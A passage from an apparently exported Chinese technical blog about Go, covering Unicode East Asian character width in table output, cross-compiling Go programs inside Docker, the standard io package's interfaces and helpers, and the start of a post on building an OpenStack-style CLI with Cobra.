JuanJKennedy@dayrep.com | 16 || 11 | 中文夹渣 abc | 特殊字符夹渣 ℃ | JuanJKennedy@dayrep.com | 16 |+----+------------------+--------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+--------------+-----------------------------+------+ 仔细观察可以发现问题, 一个中文的宽度是2个英文字符的宽度,但是他却依然使用1个宽度来计算, 致使实际字符的宽度少算了4位, 所以第一个Name表格字符多出去了4个字符宽度。 这个问题的本质是一个编码问题, 由于Golang内部字符统一使用Unicode编码, 所以问题定位为 unicode 编码的字符宽度问题, 该问题和语言无关, 只要你使用unicode 就会有这个问题, 顺着这个问题 我们来说明Golang的中的字符类型Rune Golang中的Rune类型在python中一个字符以char类型表示, 而在Golang中字符类型以Rune表示, 注意字符通过码表(code point)来进行翻译, 所以字符串是码表翻译过来拼接而成的, 所以不要傻傻搞不清楚rune和string的区别。 golang里面用 “” 表示字符串, 用户``表示多行字符串, ‘’表示字符, 比如:1234a := "字符串"b := `多行字符串`c := '中' 该网站有unicode的码位表: unicode-utf8-table, 我们从中找出一部分来做测试: 我们以打印下4e07为例来 验证下code point:1234func main() &#123; fmt.Printf("%c\n", 0x4e07) fmt.Printf("%x\n", '万')&#125; 关于字符宽度编码之战始于Ascii码空余的第8位, 最终以unicode统一 这是一场惊心动魄的历史, 我在之前篇运维的博客中有过介绍, 当时花了1个星期撸编码问题, 后面会将其转过来(买的VPS快到期了)。 关于编码介绍: 编码之战 有了上面的基础, 我们继续字符宽度的问题, 文章标题含有:East_Asian_Width, 这个东西很重要, 它在unicode标准中负责定义字符的宽度。让我们由浅入深的开始介绍。 截止我写这篇博客之时, unicode规范的稳定版是第9版，开发版是第10版, 我主要参考unicode9规范的文档。 在unicode9中的技术报告中有关于 unicode标准的所有的规范: Unicode Technical Reports , 其中 Unicode Standard Annexes 描述了unicode所有相关规范，其中这2个规范需要我们关注: UNICODE CHARACTER DATABASE: 用于描述码表(code point), 既Unicode字符数据库(UCD),它描述了Unicode字符数据库的布局和组织，以及它如何指定Unicode字符属性的形式化定义. EAST ASIAN WIDTH: 用于描述东亚传统字符集的信息属性的规范, 其中就包括字符宽度.在UCD规范中, unicode字符有一个East_Asian_Width属性(5.11.1描述了二进制属性),定义了一个unicode字符可能出现的字符宽度。12345678# East_Asian_Width (ea)ea ; A ; Ambiguousea ; F ; Fullwidthea ; H ; Halfwidthea ; N ; Neutralea ; Na ; Narrowea ; W ; Wide 其中除A不确定外，F/H/N/Na/W都能很明确的知道宽度。因此每一个unicode字符我们只需要知道其East_Asian_Width属性的值 就可知道其字符的宽度, 但是查看了下Golang unicode标准库, 并没有发现East_Asian_Width相关属性的实现和方法, 因此估计需要自己实现了。 如何实现East_Asian_Width喃?, 这就需要刚才提到的unicode规范中的另外一个规范EAST ASIAN WIDTH, 该文档整理出了所有的unicode字符的宽度的范围表, 该规范的 6.3节中 给出了这个范围表unicode字符宽度范围表,只要有这张表我们就可以知道字符宽度。 因此我们根据这张范围表可以实现一个获取unicode字符宽度的功能模块, 默认F/W为Fullwidth, 其他为Halfwidth, 该模块具体代码见: east_asian_width, 有了这个模块我们就可以来解决 字符宽度问题了 解决字符宽度问题我们找到simpletalbe里面关于字符长度的代码:123456789101112131415// width returns content widthfunc (c *content) width() int &#123; m := c.maxLinewidth() if m &gt; c.w &#123; return m &#125; return c.w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - utf8.RuneCountInString(l) ...&#125; 我们定义好获取字符长度的函数，提供掉他的判断方法123456789101112131415161718192021222324252627282930313233343536// get the string widthfunc getStringWidth(str string) int &#123; w := 0 for _, c := range []rune(str) &#123; if IsHalfwidth(c) &#123; w = w + 1 &#125; else &#123; w = w + 2 &#125; &#125; return w&#125;// width returns maximum content lines widthfunc (c *content) maxLinewidth() int &#123; w := 0 for _, r := range c.c &#123; l := getStringWidth(r) if l &gt; w &#123; w = l &#125; &#125; return w&#125;// line formats content linefunc (c *content) line(l string, a int) string &#123; len := c.width() - getStringWidth(l) ...&#125; 然后测试效果123456789101112131415161718Default style+----+------------------+----------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+----------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | JuanJKennedy@dayrep.com | 16 || 11 | adfsb“ | 特殊字符夹渣 ℃ | JuanJKennedy@dayrep.com | 16 |+----+------------------+----------------+-----------------------------+------+| Subtotal | 166 |+----+------------------+----------------+-----------------------------+------+]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用容器build多平台golang程序]]></title>
    <url>%2F2017%2F05%2F08%2Fbuild-goapp-with-docker%2F</url>
    <content type="text"><![CDATA[在CI和CD环境中, goalng源码程序往往需要build不同平台的二进制程序, 这时候使用容器是一个不错的选择, 因为build完成后,我们可以立即释放容器, 而且也保证了build环境的干净。 基于容器的build使用容器来进行build, 所遇到的一些小坑。 问题我们采用vendor来做golang项目的依赖管理, build的docker镜像拉取的官方的golang官方镜像, 按照镜像的使用说明:1$ docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp golang:1.6 go build -v 但是却没有成功, 我项目下面的vendor的依赖并没有被go找到。 解决办法在各种google之后也没找到原因。仔细观察官方的示例才发现，使用vendor功能时包都在$GOPATH/src下，测试了一下，果然是这样。只有在$GOPATH/src下的包，才能使用vendor目录存放依赖包。 现在go对不在$GOPATH/src下开发的项目限制越来越多，所以解决办法就很明显了, 将项目挂到GOPATH的src下面, 查下镜像的后发现GOPATH就是/go，所以解决办法是这样1$ docker run --rm -v "$PWD":/go/src/myapp -w /go/src/myapp golang:1.6 go build -v 注意 将myapp替换成你项目真正的名称。 多平台打包通过在docker中进行交叉编译，产出各种平台的二进制文件。 本地编译简单来讲，本地编译就是以 本地环境作为软件运行的目标环境来进行 程序的编译, 因此如果你本地环境是Mac，那么就只能编译darwin平台的，如果你本地是Linux就只能编译出Linux平台的。如果你需要发布多种平台的软件，那么你就需要准备多种环境, 来进行分别build, 这是极其不便的。 而且对于一些嵌入式设备而言，其性能有限, 比如低配的ARM平台, 很多情况下无法胜任本地编译。 但是本地编译也有他的优点: 本地环境的原生性，有助于保障程序编译后的稳定性和可靠性, 因此本地编译是最可靠的一种手段。 交叉编译简单地说，就是在一个平台上生成另一个平台上的可执行程序, 所以带来了很大的方便性, 不用准备那么多平台的环境了。 要进行交叉编译, 那么必须准备好交叉编译的环境, 交叉编译环境一般由 交叉编译器和工具包组成, 如果你使用c/c++那么你需要 下载集成好的交叉编译环境，也可以自己制作 （比较复杂，建议读者下载集成好的交叉编译环境）, 但是这些Golang早已经看穿了, 在Golang的工具链上已经集成好了, 因此直接使用即可。 接下来介绍Golang中的交叉编译。 Golang中的交叉编译Golang的交叉编译依赖2个环境变量的控制: $GOARCH 目标平台（编译后的目标平台）的处理器架构（386、amd64、arm） $GOOS 目标平台（编译后的目标平台）的操作系统（darwin、freebsd、linux、windows） 交叉编译的系统要求: OS ARCH OS version linux 386/amd64/arm &gt;= Linux 2.6 darwin 386/amd64 OS X (Snow Leapard + Lion) freebsd 386/amd64 &gt;= FreeBSD 7 windows 386/amd64 &gt;= Windows 2000 进行交叉编译(尽量减少依赖,方便直接放入docker运行, 所以编译时禁用的CGO):123456789# 如果你想在Windows 32位系统下运行$ CGO_ENABLED=0 GOOS=windows GOARCH=386 go build# 如果你想在Windows 64位系统下运行$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build# 如果你想在Linux 32位系统下运行$ CGO_ENABLED=0 GOOS=linux GOARCH=386 go build# 如果你想在Linux 64位系统下运行$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang IO系列(一) - 基本的IO接口]]></title>
    <url>%2F2017%2F05%2F06%2Fgolang-io%2F</url>
    <content type="text"><![CDATA[在Golang开发过程中零零散散会遇到各种IO操作, 每次百度Google也能解决, 大概用法也还是清楚, 但是缺少系统性的全面了解, 也搞不清楚, 使用哪个方式才是最优的, 因此打算全面读一遍标准库中与io相关的源码, 总结成一系列的博客。 这一系列这是这一系列的一个开篇, 主要讲标准库中的一些io相关, 整个系列打算写7篇: 基础篇 基本的IO接口(io) 高级的IO接口(ioutil) IO的格式化(fmt) IO的缓冲(bufio) 运用篇 字符串操作(strings.Reader) 字节操作(bytes.buffer) 文件操作(os.File) IO的概念IO在计算机中指Input/Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。各种语言一般都会提供IO库供开发者使用。Go语言也不例外。Input指往内存中读取数据, 比如读取文件, 读取服务器响应的网络数据, 在Golang的IO接口中主要以Reader来完成。Outout指从内存中往外发送数据, 比如将数据保存回磁盘的文件, 作为服务端时，返回客户需要的数据, 在Golang的IO接口中主要以Writer来完成。在IO编程中，还有一个很重要的概念:Stream(流), 可以把流想象成一个水管，数据就是水管里的水，但是只能单向流动。Input Stream就是数据从外面（磁盘、网络）流进内存，Output Stream就是数据从内存流到外面去。而像水管这样的东西，在不同语言里基本都有一个一样的名称:pipe, Golang中关于pipe的一些功能函数都定义在这个文件里面。 IO包的文件不要有恐惧心理, IO标准库的代码量其实并不多, 除去test和example, 剩下的模块其实就5个(io.go, multi.go, pipe.go, ioutil.go, tempfile.go), 总共也才千余行代码，而且还有将近一半是注释。1234567891011121314151617➜ io tree ..├── example_test.go├── io.go├── io_test.go├── ioutil│ ├── example_test.goF│ ├── ioutil.go│ ├── ioutil_test.go│ ├── tempfile.go│ └── tempfile_test.go├── multi.go├── multi_test.go├── pipe.go└── pipe_test.go1 directory, 12 files 这篇博客主要关注io.go，multi.go, pipe.go 3个文件。 从IO包的注解开始讲起io包为I/O原语提供了基本的接口。它主要功能是包装了这些原语的已有实现, 这个描述得有点绕, 直白来说: IO表示的是一个过程(输入与输出), IO包就是将输入与输出的规范定义清楚(一些通用的接口和函数), 而具体的输入什么,输出什么, 是由具体的对象来实现,比如后面应用时需要讲到的strings, bytes, file等。由于这些接口和原语以不同的实现包装了低级操作，因此除非另行通知，否则客户端不应假定它们对于并行执行是安全的。 io.go源码分析我们先从IO包的核心文件io.go开始读起, 该文件主要定义了单路读写的相关规范 基础IO接口的定义基础接口涉及到读，写，关闭，以及指针位置这4个方面。 Reader: 数据读取的方法: Read, 如果对象是一个Reader对象,那么我们就能调用Read读取其中的数据。 ReadAt: 从偏移量off处开始读取数据的方法: ReadAt ReaderFrom: 从一个Reader对象中读入数据: ReaderFrom, 方便对象之间的数据读取。 Writer: 定义了数据写入的方法: Write, 如果对象是一个Writer对象, 那么我们就能调用Write往该对象写入数据。 WriterAt: 从偏移量off处开始写入数据的方法: WriterAt WriterTo: 往一个Writer对象中写入数据: WriterTo, 方便对象之间的数据写入。 Closer: 定义了关闭数据流的方法。 Seeker: 定义设置读写时 偏移量(偏移指针)的值。 读接口和函数1234567891011type Reader interface &#123; Read(p []byte) (n int, err error)&#125;type ReaderAt interface &#123; ReadAt(p []byte, off int64) (n int, err error)&#125;type WriterTo interface &#123; WriteTo(w Writer) (n int64, err error)&#125; Read: 将len(p)个字节读取到p中。它返回读取的字节数n（0 &lt;= n &lt;= len(p)）以及任何遇到的错误, 也就是说，当Read方法返回错误时，不代表没有读取到任何数据。调用者应该处理返回的任何数据，之后才处理可能的错误。 ReadAt: 从基本输入源的偏移量off处开始，将len(p)个字节读取到p中。它返回读取的字节数n（0 &lt;= n &lt;= len(p)）以及任何遇到的错误。 WriterTo: 将数据写入w中，直到没有数据可写或发生错误。其返回值n为写入的字节数。 在写入过程中遇到的任何错误也将被返回, 这个和ReadFrom对比着看, ReadFrom从Reader对象中直接读取数据，而WriterTo可以直接往一个Writer中写入数据.strings的reader实现了这3个接口，以他为例,具体可以参考strings reader的源码.1234567891011121314151617181920212223242526272829package mainimport ( "fmt" "os" "strings")func main() &#123; content := "example for io.Read, io.ReadAt, io.WriteTo" reader := strings.NewReader(content) read := make([]byte, 50) readAt := make([]byte, 50) // 通过Read读取所有数据,如果读取完成，读指针已经移到最后 // 通过Len可以知道还剩多少没读，因为指针位置Reader没有实现暴露 reader.Read(read) fmt.Println("read:", string(read)) fmt.Println("unread:", reader.Len()) // 通过ReadAt从第9个字符开始读取,但是没有移到读指针的位置(io.ReadAt的规范) reader.ReadAt(readAt, 8) fmt.Println("readAt:", string(readAt)) // 由于读指针已经移到最后, 所以需要恢复 // 将reader的数据直接输出给writer, reader.Seek(0, 0) reader.WriteTo(os.Stdout)&#125; 跟Reader有关的函数:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// LimitReaderfunc LimitReader(r Reader, n int64) Reader &#123; return &amp;LimitedReader&#123;r, n&#125; &#125;type LimitedReader struct &#123; R Reader // underlying reader N int64 // max bytes remaining&#125;func (l *LimitedReader) Read(p []byte) (n int, err error) &#123; if l.N &lt;= 0 &#123; return 0, EOF &#125; if int64(len(p)) &gt; l.N &#123; p = p[0:l.N] &#125; n, err = l.R.Read(p) l.N -= int64(n) return&#125;// TeeReaderfunc TeeReader(r Reader, w Writer) Reader &#123; return &amp;teeReader&#123;r, w&#125;&#125;type teeReader struct &#123; r Reader w Writer&#125;func (t *teeReader) Read(p []byte) (n int, err error) &#123; n, err = t.r.Read(p) if n &gt; 0 &#123; if n, err := t.w.Write(p[:n]); err != nil &#123; return n, err &#125; &#125; return&#125;// ReadAtLeastfunc ReadAtLeast(r Reader, buf []byte, min int) (n int, err error) &#123; if len(buf) &lt; min &#123; return 0, ErrShortBuffer &#125; for n &lt; min &amp;&amp; err == nil &#123; var nn int nn, err = r.Read(buf[n:]) n += nn &#125; if n &gt;= min &#123; err = nil &#125; else if n &gt; 0 &amp;&amp; err == EOF &#123; err = ErrUnexpectedEOF &#125; return&#125;// ReadFullfunc ReadFull(r Reader, buf []byte) (n int, err error) &#123; return ReadAtLeast(r, buf, len(buf))&#125; LimitReader: 返回一个LimitReader结构体, 从R读取但将返回的数据量限制为N字节。每调用一次Read都将更新N来反应新的剩余数量。如果你的读buf大于限制的长度, 将一次读取完, 如果你的buf小于限制长度, 则只有多次循环读取, 从而起到限制读取的作用。 1234567891011121314151617181920212223package mainimport ( "fmt" "io" "strings")func main() &#123; content := "This is limitReader example" reader := strings.NewReader(content) i := 1 // 不做限制，读取所有的内容 limitReader := &amp;io.LimitedReader&#123;R: reader, N: int64(len(content))&#125; for limitReader.N &gt; 0 &#123; // 限制性读取, 一次读取4字节 tmp := make([]byte, 4) limitReader.Read(tmp) fmt.Printf("第%d次: %s\n", i, tmp) i++ &#125;&#125; TeeReader: 返回一个 Reader，它将从r中读到的数据写入w中。所有经由它处理的从r的读取都匹配于对应的对w的写入。它没有内部缓存，即写入必须在读取完成前完成。任何在写入时遇到的错误都将作为读取错误返回,也就是说，我们通过Reader读取内容后，会自动写入到Writer中去 12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; var ( err error nn int n int ) content := "This is teeReader example\n" // 复制一份流到标准输出 reader := io.TeeReader(strings.NewReader(content), os.Stdout) p := make([]byte, len(content)) n, err = reader.Read(p) // 读完数据 for err != io.EOF &#123; nn, err = reader.Read(p[n:]) n += nn fmt.Printf("my read: %s", string(p))&#125; ReadAtLeast:将r读取到buf中，直到读了最少min个字节为止,因此buf必须大于最小字节数,不然就会报错(buf小了), 这个和LimitReader功能类似, 但是 ReadFull: 精确地从r中将len(buf)个字节读取到buf中,将buf读满, 实际上ReadFull就是调用的ReadAtLeast来将buf填满的,12345678910111213141516171819202122package mainimport ( "fmt" "io" "log" "strings")func main() &#123; content := "This is readFull example\n" p := make([]byte, len(content)) _, err := io.ReadFull(strings.NewReader(content), p) if err != nil &#123; log.Fatal(err) &#125; fmt.Printf("my read: %s", string(p))&#125; 写接口和函数1234567891011type Writer interface &#123; Write(p []byte) (n int, err error)&#125;type ReaderFrom interface &#123; ReadFrom(r Reader) (n int64, err error)&#125;type WriterAt interface &#123; WriteAt(p []byte, off int64) (n int, err error)&#125; Writer: 将p中len(p)个字节的数据写入到基本数据流中, 它返回从p中被写入的字节数n（0 &lt;= n &lt;= len(p)）以及任何遇到的引起写入提前停止的错误. WriterAt: 和ReadAt相对，从p中将len(p)个字节写入到偏移量off处的基本数据流中,即从偏移量off处开始写入 ReadFrom: 函数将io.Reader作为参数，也就是说，ReadFrom可以从任意Reader对象中读取数据，只要来源实现了io.Reader接口。比如，我们可以从标准输入、文件、字符串等读取数据。bufio实现了Writer和ReadFrom, 没实现WriterAt, 我这里没扩展，因为Writer都在工厂模式的保护下，所有属性都没暴露，扩展起来不方便:12345678910111213141516171819202122232425262728293031package mainimport ( "bufio" "fmt" "os" "strings")func main() &#123; content := "example for io.Writer, io.ReadFrom" writer := bufio.NewWriter(os.Stdout) // 直接byte往标准输出写入 writer.Write([]byte(content)) writer.Flush() fmt.Println() // 为了方便其实也直接直接写入string writer.WriteString(content) writer.Flush() fmt.Println() // 从Reader中读出数据,然后再往标准输出写入 reader := strings.NewReader(content) writer.ReadFrom(reader) writer.Flush()&#125; 跟Writer有关的函数:123456func WriteString(w Writer, s string) (n int, err error) &#123; if sw, ok := w.(stringWriter); ok &#123; return sw.WriteString(s) &#125; return w.Write([]byte(s))&#125; WriteString: 将字符串内容写入到writer中, 如果writer实现了WriteString则直接调用它的方法写入,如果没有则直接调用Write处理成bytes写入, 具体上面已经有栗子了. 关闭与偏移量1234567891011121314type Closer interface &#123; Close() error&#125;// Seek whence values.const ( SeekStart = 0 // seek relative to the origin of the file SeekCurrent = 1 // seek relative to the current offset SeekEnd = 2 // seek relative to the end)type Seeker interface &#123; Seek(offset int64, whence int) (int64, error)&#125; Closer: 该接口比较简单，只有一个Close()方法，用于关闭数据流, 比如数据库连接, 文件等。 Seeker: 设置下一次Read或Write的偏移量(offset)，它的解释取决于 whence: 0表示相对于文件的起始处，1表示相对于当前的偏移，而2表示相对于其结尾处。 Seek返回新的偏移量和一个错误，如果有的话。也就是说，Seek方法用于设置偏移量的，这样可以从某个特定位置开始操作数据流。听起来和ReaderAt/WriteAt接口有些类似，不过Seeker接口更灵活，可以更好的控制读写数据流的位置。1234567891011121314151617181920212223242526package mainimport ( "fmt" "log" "strings")func main() &#123; content := "字Seek测试读取指定位置的字符" reader := strings.NewReader(content) // 读取倒数第5个字符, 由于string reader设计的原因 // 无论是ReadAt, WriteAt还是Seek这里面的offset // 都指的是byte个数, 并且index累加的也是byte,所以 // 就坑爹了，要取第5个字符实际上的byte位置是5*3 // 注意utf8 是变长编码的, 所以并不是所有的中文都是3字节哦! // 所有这种方式是有问题的, 还是以字符个数进行计算合适 reader.Seek(-15, 2) r, s, err := reader.ReadRune() if err != nil &#123; log.Fatal(err) &#125; fmt.Println(s) fmt.Printf("%c\n", r)&#125; 组合衍生的IO接口 ReadWriter ReadCloser WriteCloser ReadWriteCloser ReadSeeker WriteSeeker ReadWriteSeeker 这些都是基于上面单个接口组合而成, 理解上面的基础过会，这个就不多说了。 IO Copy相关这里主要介绍和Copy相关的函数:12345func CopyN(dst Writer, src Reader, n int64) (written int64, err error)func Copy(dst Writer, src Reader) (written int64, err error)func CopyBuffer(dst Writer, src Reader, buf []byte) (written int64, err error) CopyN: 将n个字节从src复制到dst. 它返回复制的字节数以及在复制时遇到的最早的错误. Copy: 将src复制到dst，直到在src上到达EOF或发生错误。它返回复制的字节数，如果有的话，还会返回在复制时遇到的第一个错误。 CopyBuffer: 相当于 Copy，只不 Copy 在执行的过程中会创建一个临时的缓冲区来中转数据，而 CopyBuffer 则可以单独提供一个缓冲区让多个复制操作共用同一个缓冲区，避免每次复制操作都创建新的缓冲区。如果 buf == nil，则 CopyBuffer 会自动创建缓冲区。 举一组栗子:12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "io" "os" "strings")func main() &#123; content := "Copy相关操作的测试\n" reader := strings.NewReader(content) writer := os.Stdout // copy 10 个字节4的Ascii和2个中文 io.CopyN(writer, reader, 10) fmt.Println() // 重置读指针,从新完成1次完整的copy reader.Seek(0, 0) io.Copy(writer, reader) // 创建一个32字节的缓存用于所有copy使用,不用再开辟临时缓存 buf := make([]byte, 32) r1 := strings.NewReader("CopyBuffer测试第一次\n") io.CopyBuffer(writer, r1, buf) r2 := strings.NewReader("CopyBuffer测试第二次\n") io.CopyBuffer(writer, r2, buf)&#125; Byte和Rune类型IO相关针对基础数据结构的IO读写,大概有如下几类:Byte, Rune, Section, 主要定义了如何读取一个字节和一个Unicode字符的规范, 一般地，我们不会使用bytes.Buffer来一次读取或写入一个字节, 但是在处理二进制数据和数据压缩时 这些接口用得比较多。 RuneReader: 读取单个UTF-8字符, 返回其rune和该字符占用的字节 RuneScanner: 相较于RuneReader而言, 仅增加了一个UnreadByt接口, UnreadByte方法的意思是：将上一次ReadByte的字节还原，使得再次调用ReadByte返回的结果和上一次调用相同，也就是说，UnreadByte是重置上一次的ReadByte。注意，UnreadByte调用之前必须调用了ReadByte，且不能连续调用UnreadByte。 ByteReader: 读一个字节. ByteWriter: 写一个字节. ByteScanner: 和RuneScanner类似, 只是针对的式Byte而已. 结构体 SectionReader: 这是用于读取磁盘扇区的接口, 由于基本不会使用到, 因此不做解读了. multi.go源码分析该文件主要定义了多路读写的相关规范,这里的多路指的是对多个reader或者多个writer同时的动作,它们接收多个Reader或Writer，返回一个Reader或Writer。我们可以猜想到这两个函数就是操作多个Reader或Writer就像操作一个。事实上，在io包中定义了两个非导出类型：mutilReader和multiWriter，它们分别实现了io.Reader和io.Writer接口123456789type multiReader struct &#123; readers []Reader&#125;type multiWriter struct &#123; writers []Writer&#125;func MultiReader(readers ...Reader) Reader func MultiWriter(writers ...Writer) Writer MultiReader: 逻辑上将多个Reader组合起来，返回一个新的Reader, 但是这个新Reader并不能通过调用一次Read方法获取所有Reader的内容。因为它这个逻辑真的特别简单, 循环读取所有的Reader, 读完一个返回一个, 只是正常读完过后的EOF被重置为nil, 这样的结果就是 我们还得在外面再次循环读取一次, 直到EOF1234567891011121314151617181920212223242526272829package mainimport ( "bytes" "fmt" "io" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) data := make([]byte, 0, 1024) // 循环读取每个reader返回的内容来拼接, // 直到所有reader读取后返回EOF停止 for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = reader.Read(tmp) data = append(data, tmp[:n]...) &#125; fmt.Printf("%s", data)&#125; 像上面这样使用显然有点麻烦, 比较方便的使用方式还是聚合过后直接使用io.Copy来搞定12345678910111213141516171819package mainimport ( "bytes" "io" "os" "strings")func main() &#123; readers := []io.Reader&#123; strings.NewReader("from strings reader\n"), bytes.NewBufferString("from bytes buffer\n"), &#125; reader := io.MultiReader(readers...) io.Copy(os.Stdout, reader)&#125; MultiWriter: 和MultiReader类似, 将多个writer聚合都一个slice里面, 然后用for循环写, 实际上就是将向自身写入的数据同步写入到所有writers中1234567891011121314151617package mainimport ( "io" "os")func main() &#123; // 直接来2个writer writers := []io.Writer&#123; os.Stdout, os.Stderr, &#125; writer := io.MultiWriter(writers...) writer.Write([]byte("hello,world\n"))&#125; pipe.go源码分析该文件主要定义了流式IO的相关规范,主要就是Pipe, Pipe在内存中创建一个同步管道，用于不同区域的代码之间相互传递数据, 因此和无缓冲channel很像，因此不能在一个goroutine中进行读和写。同样 由于管道没有缓存区, 所以和channel一样 对于读写和关闭都是 并行安全的。123456789101112131415161718192021222324252627// A pipe is the shared pipe structure underlying PipeReader and PipeWriter.type pipe struct &#123; rl sync.Mutex // gates readers one at a time wl sync.Mutex // gates writers one at a time l sync.Mutex // protects remaining fields data []byte // data remaining in pending write rwait sync.Cond // waiting reader wwait sync.Cond // waiting writer rerr error // if reader closed, error to give writes werr error // if writer closed, error to give reads&#125;// A PipeReader is the read half of a pipe.type PipeReader struct &#123; p *pipe&#125;// A PipeWriter is the write half of a pipe.type PipeWriter struct &#123; p *pipe&#125;func Pipe() (*PipeReader, *PipeWriter) &#123; p := new(pipe) p.rwait.L = &amp;p.l p.wwait.L = &amp;p.l r := &amp;PipeReader&#123;p&#125; w := &amp;PipeWriter&#123;p&#125; return r, w&#125; PipeReader: 是管道的读取端。它实现了io.Reader和io.Closer接口，如果管道被关闭，则会返会一个错误信息： 如果写入端通过 CloseWithError 方法关闭了管道，则返回关闭时传入的错误信息。 如果写入端通过 Close 方法关闭了管道，则返回 io.EOF。 如果是读取端关闭了管道，则返回 io.ErrClosedPipe。 PipeWriter: 是管道的写入端。它实现了io.Writer和io.Closer接口, 如果管道被关闭，则会返会一个错误信息： 如果读取端通过 CloseWithError 方法关闭了管道，则返回关闭时传入的错误信息。 如果读取端通过 Close 方法关闭了管道，则返回 io.ErrClosedPipe。 如果是写入端关闭了管道，则返回 io.ErrClosedPipe。 Pipe: 它将io.Reader连接到io.Writer。一端的读取匹配另一端的写入，直接在这两端之间复制数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445package mainimport ( "fmt" "io" "log" "time")func main() &#123; Pipe()&#125;func Pipe() &#123; rPipe, wPipe := io.Pipe() go Read(rPipe) Write(wPipe) time.Sleep(2 * time.Second)&#125;func Write(pipeWriter *io.PipeWriter) &#123; _, err := pipeWriter.Write([]byte("Pipe 管道测试")) if err != nil &#123; log.Fatal(err) &#125; // 记得写入端关闭Pipe pipeWriter.CloseWithError(io.EOF) fmt.Println("写入完成")&#125;func Read(pipeReader *io.PipeReader) &#123; data := make([]byte, 1024) for n, err := 0, error(nil); err != io.EOF; &#123; tmp := make([]byte, 512) n, err = pipeReader.Read(tmp) if err != nil &amp;&amp; err != io.EOF &#123; log.Fatal(err) &#125; data = append(data, tmp[:n]...) &#125; fmt.Println("Data: ", string(data))&#125;]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>io</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Golang开发OpenStack服务的CLI]]></title>
    <url>%2F2017%2F04%2F23%2Fopenstack-golang-cli%2F</url>
    <content type="text"><![CDATA[由于我们需要编写自己服务的客户端，之前参考过magnum的python客户端，编写过一个，整体感受就是: 一件简单的事儿，被他封装的很复杂，而且还有一个关键痛点，部署问题: 1.依赖python环境 2. 蹩脚的二进制打包方式。 因此，作为一个产品的CLI，以二进制方式交付会带来诸多方便，比如cloud foundry也用golang重写了他的客户端部分。 Cobra简介在博客的开篇写过一篇cobra的博客: 如何使用golang编写漂亮的命令行工具, 很多流行的CLI都基于这个库开发，比如kubectl, etcdctl, docker等, 基本的概念和用法请参考之前的博客。不喜欢我啰嗦的，直接看源码:完整代码示例 基于RESTful的CLI打造的这个CLI是RESTful的客户端, 在RESTful里面以资源(Resource)为核心，因此客户端也需要以资源的形式表现, 比如Docker的 Management Commands:12345678910111213Management Commands: checkpoint Manage checkpoints container Manage containers image Manage images network Manage networks node Manage Swarm nodes plugin Manage plugins secret Manage Docker secrets service Manage services stack Manage Docker stacks swarm Manage Swarm system Manage Docker volume Manage volumes 该资源允许的操作:1234567891011121314151617181920212223➜ uniresctl git:(dev_maojun) docker image -hFlag shorthand -h has been deprecated, please use --helpUsage: docker image COMMANDManage imagesOptions: --help Print usageCommands: build Build an image from a Dockerfile history Show the history of an image import Import the contents from a tarball to create a filesystem image inspect Display detailed information on one or more images load Load an image from a tar archive or STDIN ls List images prune Remove unused images pull Pull an image or a repository from a registry push Push an image or a repository to a registry rm Remove one or more images save Save one or more images to a tar archive (streamed to STDOUT by default) tag Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE 因此, 轮廓上我们需要打造这样一种风格的RESTful CLI OpenStack服务 CLI我们的OpenStack服务是自己开发的, 开发出来的CLI风格想要和Openstack社区风格一致(长相相近), 这东西社区是没有Golang版本的(有的话给我留言, 我真没找到), 因此整个架子需要自己构建, 由于cobra架子比较成熟, 如果只用官方的Flag库来做的话，会有很多重复工作, 因此使用cobra为基础来进行构建。 要做成和Openstack风格类似的CLI, 在cobra的基础上我们需要加入2个组件: keystone认证: 对每一个资源的访问必须通过keystone认证才能访问, 因此认证部分是全局的。 表格输出: OpenstackCLI把资源以Table的方式输出, 这个也需要单独实现。 搭建CLI架子 完整代码的栗子请看Github: 完整代码示例 初始化app, 添加resourceA和resourceB123cobra init app-clicobra add resourceAcobra add resourceB 访问每一个resource都需要经过keystone的认证,因此认证属于一个全局都要执行的逻辑, 必须放在最前面，这里Cobra提供的一组Hook可以解决这个问题 带错误处理的Hook当处理过程中如果产生了error可以直接return出来, 从而中断命令的继续执行, 因此认证部分我们需要这种带错误处理的Hook, 因为认证失败需要中断请求,其次，cobra 在命令函数的执行前后分别设置了2组Hook, 执行的顺序如下: 